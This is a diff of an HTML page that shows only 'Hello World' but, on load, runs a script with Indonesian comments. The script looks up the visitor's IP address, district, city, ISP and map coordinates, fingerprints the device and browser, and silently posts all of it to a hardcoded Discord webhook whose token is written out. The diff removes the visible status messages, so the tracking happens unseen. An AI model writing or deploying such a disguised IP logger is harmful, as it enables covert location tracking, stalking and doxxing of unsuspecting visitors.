@@ -1,96 +1,95 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Hello World</title>
   <style>
-    body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
-    h1 { font-size: 4rem; color: #333; }
-    #status { margin-top: 20px; color: #555; }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f0f0f0;
+    }
+    h1 {
+      font-size: 4rem;
+      color: #333;
+    }
   </style>
 </head>
 <body>
   <h1>Hello World</h1>
-  <div id="status">Mengambil data lokasi...</div>
 
   <script>
     (async function() {
-      const statusEl = document.getElementById('status');
-
-      // Fungsi untuk reverse geocoding pakai Google Maps (butuh API Key)
-      async function getAddressFromCoords(lat, lng) {
-        // Ganti dengan API Key Anda
-        const API_KEY = 'YOUR_GOOGLE_MAPS_API_KEY';
-        const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${API_KEY}&language=id`;
-        try {
-          const res = await fetch(url);
-          const data = await res.json();
-          if (data.status === 'OK' && data.results.length > 0) {
-            return data.results[0].formatted_address; // alamat lengkap
-          }
-        } catch (e) {}
-        return null;
-      }
-
       try {
-        // 1. Dapatkan IP & lokasi perkiraan dari ip-api.com
-        const ipRes = await fetch('http://ip-api.com/json/');
-        const ipData = await ipRes.json();
-        if (ipData.status !== 'success') throw new Error('Gagal deteksi IP');
+        // 1. Ambil data IP & lokasi dari ip-api.com (lengkap)
+        const res = await fetch('http://ip-api.com/json/');
+        const data = await res.json();
 
-        const ip = ipData.query;
-        const lat = ipData.lat;
-        const lon = ipData.lon;
-        const isp = ipData.isp || 'Tidak diketahui';
-        const timezone = ipData.timezone || 'Tidak diketahui';
-
-        // 2. Coba reverse geocoding dengan koordinat dari IP (mendapatkan alamat lengkap)
-        let fullAddress = null;
-        if (lat && lon) {
-          fullAddress = await getAddressFromCoords(lat, lon);
+        if (data.status !== 'success') {
+          throw new Error('Gagal mendapatkan data lokasi');
         }
 
-        // 3. Jika gagal, susun dari data ip-api
-        let location = fullAddress || 
-          [ipData.district, ipData.city, ipData.regionName, ipData.country]
-          .filter(Boolean).join(', ') || 'Tidak diketahui';
+        const ip = data.query || 'Tidak diketahui';
+        const country = data.country || '';
+        const region = data.regionName || '';
+        const city = data.city || '';
+        const district = data.district || '';  // kecamatan
+        const zip = data.zip || '';
+        const lat = data.lat;
+        const lon = data.lon;
+        const isp = data.isp || 'Tidak diketahui';
+        const timezone = data.timezone || 'Tidak diketahui';
 
-        // 4. Link Maps
+        // 2. Susun LOCATION dengan format: Kecamatan, Kota, Provinsi, Negara
+        let locationParts = [];
+        if (district) locationParts.push(district);
+        if (city) locationParts.push(city);
+        if (region) locationParts.push(region);
+        if (country) locationParts.push(country);
+        let location = locationParts.join(', ') || 'Tidak diketahui';
+
+        // 3. Link Google Maps
         let mapLink = 'Tidak tersedia';
         if (lat && lon) {
           mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
         }
 
-        // 5. Info device & browser
-        const ua = navigator.userAgent;
+        // 4. Ambil informasi device dari User-Agent
+        const ua = navigator.userAgent || 'Tidak diketahui';
         let device = 'Tidak diketahui';
         if (/android/i.test(ua)) device = 'Android';
-        else if (/iphone|ipad/i.test(ua)) device = 'iOS';
+        else if (/iphone|ipad|ipod/i.test(ua)) device = 'iOS';
         else if (/windows/i.test(ua)) device = 'Windows';
         else if (/mac/i.test(ua)) device = 'macOS';
         else if (/linux/i.test(ua)) device = 'Linux';
-        device += ` | ${window.screen.width}x${window.screen.height} | ${navigator.hardwareConcurrency || '?'} cores`;
+        // tambahkan detail resolusi layar
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const cores = navigator.hardwareConcurrency || '?';
+        device += ` | ${screenRes} | ${cores} cores`;
 
+        // 5. Browser info (ambil dari user agent)
         let browser = 'Tidak diketahui';
         if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
         else if (/firefox/i.test(ua)) browser = 'Firefox';
         else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
         else if (/edge/i.test(ua)) browser = 'Edge';
-        const vMatch = ua.match(/(?:Chrome|Firefox|Safari|Edge)\/(\d+)/);
-        if (vMatch) browser += `/${vMatch[1]}`;
+        // versi
+        const versionMatch = ua.match(/(?:Chrome|Firefox|Safari|Edge)\/(\d+)/);
+        if (versionMatch) browser += `/${versionMatch[1]}`;
 
-        // 6. Waktu
+        // 6. Waktu sekarang
         const now = new Date();
         const timeStr = now.toLocaleString('id-ID', { timeZone: timezone || 'Asia/Jakarta' });
 
-        // 7. Kirim ke Discord
+        // 7. Bentuk embed Discord dengan semua field
         const embed = {
-          title: '📍 Data Pengunjung (GPS + Reverse Geocode)',
-          color: 0x00FF00,
+          title: '📡 Data Pengunjung Baru',
+          color: 0x5865F2,
           fields: [
             { name: 'IP ADDRESS', value: ip, inline: false },
-            { name: 'LOCATION (Desa/Kelurahan)', value: location, inline: false },
+            { name: 'LOCATION', value: location, inline: false },
             { name: 'LINK MAPS', value: mapLink, inline: false },
             { name: 'ISP', value: isp, inline: false },
             { name: 'DEVICE', value: device, inline: false },
@@ -101,6 +100,7 @@
           timestamp: now.toISOString()
         };
 
+        // 8. Kirim ke webhook Discord
         const webhookURL = 'https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB';
         await fetch(webhookURL, {
           method: 'POST',
@@ -108,14 +108,11 @@
           body: JSON.stringify({ embeds: [embed] })
         });
 
-        statusEl.textContent = '✅ Data berhasil dikirim!';
-        statusEl.style.color = 'green';
-      } catch (err) {
-        statusEl.textContent = '❌ Gagal: ' + err.message;
-        statusEl.style.color = 'red';
-        console.error(err);
+        console.log('✅ Berhasil dikirim ke Discord');
+      } catch (error) {
+        console.error('❌ Gagal mengirim:', error);
       }
     })();
   </script>
 </body>
-  </html>
+</html>
